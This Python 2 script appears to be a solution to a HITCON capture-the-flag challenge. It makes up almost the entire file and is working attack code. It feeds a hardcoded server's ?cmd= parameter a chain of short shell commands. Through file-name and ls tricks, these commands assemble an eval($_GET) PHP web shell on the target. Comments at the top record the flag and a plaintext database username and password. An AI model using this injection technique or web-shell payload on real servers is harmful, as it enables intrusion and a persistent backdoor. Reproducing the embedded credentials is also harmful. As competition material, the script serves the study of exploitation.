import urllib
import urllib2
import time

# hitcon{idea_from_phith0n,thank_you:)}
# cat /home/fl4444g/README.txt
# Flag is in the MySQL database
# fl4444g / SugZXUtgeJ52_Bvr


url = "http://52.199.204.34/"

payload = """
>\<?=
ls>\x01
rm *=
>\$a=
ls>>\x01
rm *=
>sys.
ls>>\x01
rm *.
>te.
ls>>\x01
rm *.
>m\;
ls>>\x01
rm m*
>\$a
ls>>\x01
rm *a
>\(\(
ls>>\x01
rm ??
>ec.
ls>>\x01
rm e*
>ho.
ls>>\x01
rm h*
>chr
ls>>\x01
rm c*
>\(\#
ls>>\x01
rm ??
>32
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>chr
ls>>\x01
rm c*
>\(\#
ls>>\x01
rm ??
>39
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>chr
ls>>\x01
rm c*
>\(\#
ls>>\x01
rm ??
>60
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>chr
ls>>\x01
rm c*
>\(\#
ls>>\x01
rm ??
>63
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>chr
ls>>\x01
rm c*
>\(\#
ls>>\x01
rm ??
>61
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>ev.
ls>>\x01
rm e*
>al.
ls>>\x01
rm a*
>chr
ls>>\x01
rm c*
>\(\#
ls>>\x01
rm ??
>40
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>chr
ls>>\x01
rm c*
>\(\#
ls>>\x01
rm ??
>36
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>_G.
ls>>\x01
rm _*
>ET.
ls>>\x01
rm E*
>chr
ls>>\x01
rm c*
>\(\#
ls>>\x01
rm ??
>91
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>a.
ls>>\x01
rm ??
>chr
ls>>\x01
rm c*
>\(\#
ls>>\x01
rm ??
>93
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>chr
ls>>\x01
rm c*
>\(\#
ls>>\x01
rm ??
>41
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>chr
ls>>\x01
rm c*
>\(\#
ls>>\x01
rm ??
>59
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>chr
ls>>\x01
rm c*
>\(\#
ls>>\x01
rm ??
>39
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>chr
ls>>\x01
rm c*
>\(\(
ls>>\x01
rm ??
>62
ls>>\x01
rm ??
>\)\#
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>zx.
ls>>\x01
rm z*
>chr
ls>>\x01
rm c*
>\(\#
ls>>\x01
rm ??
>46
ls>>\x01
rm ??
>\).
ls>>\x01
rm ??
>php
ls>>\x01
rm p*
>\)\)
ls>>\x01
rm ??
>\;\;
ls>>\x01
rm ??
"""
payload = payload.split("\n")
while True:
	if '' in payload:
		payload.remove('')
	else:
		break

#print payload
for i in payload:
	pay = urllib.quote_plus(i)
	response = urllib2.urlopen(url + "?cmd=" + pay)
	html = response.read()
	time.sleep(0.1)
print 'done'
